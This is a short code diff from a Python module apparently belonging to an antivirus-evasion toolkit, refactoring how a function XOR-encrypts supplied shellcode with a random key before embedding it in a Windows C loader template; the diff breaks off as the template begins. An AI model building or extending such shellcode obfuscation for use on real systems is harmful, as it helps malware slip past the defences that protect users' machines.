@@ -1,10 +1,9 @@
-from Web.AntiAntiVirus.EncryptionProcessing import XOR
 from ClassCongregation import BinaryDataTypeConversion
 import random
 def GenerateCode(Shellcode):
     BytesTypeBinaryData=BinaryDataTypeConversion().StringToBytes(Shellcode)#对数据进行类型转换
     GenerateRandomNumber=random.randint(1, 255)#生成的随机数
-    XOREncryption=XOR(GenerateRandomNumber,BytesTypeBinaryData)#进行XOR加密
+    XOREncryption=BinaryDataTypeConversion().XOR(GenerateRandomNumber,BytesTypeBinaryData)#进行XOR加密
     Code = """
 #include <Windows.h>
 
